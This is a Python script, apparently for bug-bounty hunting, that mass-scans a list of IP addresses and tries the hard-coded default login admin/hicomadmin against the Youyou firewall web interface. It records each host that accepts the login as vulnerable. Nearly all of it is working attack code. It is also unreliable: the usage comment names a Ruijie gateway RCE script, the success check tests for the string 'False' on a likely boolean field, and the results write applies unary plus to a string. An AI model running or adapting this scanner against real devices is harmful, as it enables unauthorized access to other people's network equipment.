import requests
import logging
import json

# 使用方法:
# python RuiJie_EG_gateway_rce.py

logging.captureWarnings(True)
fopen = open("/Users/hecanfeng/019_SRC漏洞挖掘/佑友防火墙.txt", 'r')
lines = fopen.readlines()

for ip in lines:

    url = ip + "/index.php?c=user&a=ajax_save"
    payload = {"username": "admin", "password": "hicomadmin", "language": "zh-cn"}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
    }
    print("来这里来吗？")
    try:
        print("准备发送post包了")
        r = requests.request("post",url, headers=headers, verify=False, timeout=1, data=payload)
        print("下一步，查看响应数据")
        print(type(r))
        data = r.text
        print(type(data))
        print("成功查看响应数据，对数据进行json解析")
        dict_data = json.loads(data)
        print(type(dict_data))
        print(dict_data)
        print("成功解析数据，查找success字段")
        data_com = dict_data['success']
        print(type(data_com))
        print("成功找到success字段，下一步抓取字段中到true值")
        print(data_com)
        if "False" in data_com:
            print("\033[32m[o]#################" + ip + "存在佑友防火墙弱口令漏洞#################\033[0m")
            with open("佑友防火墙弱口令漏洞结果.txt", mode="a") as rp:
                rp.write(+ip + " 登陆成功！" + "\n")
        else:
            print(ip + "不存在佑友防火墙弱口令漏洞")
    except:
        pass
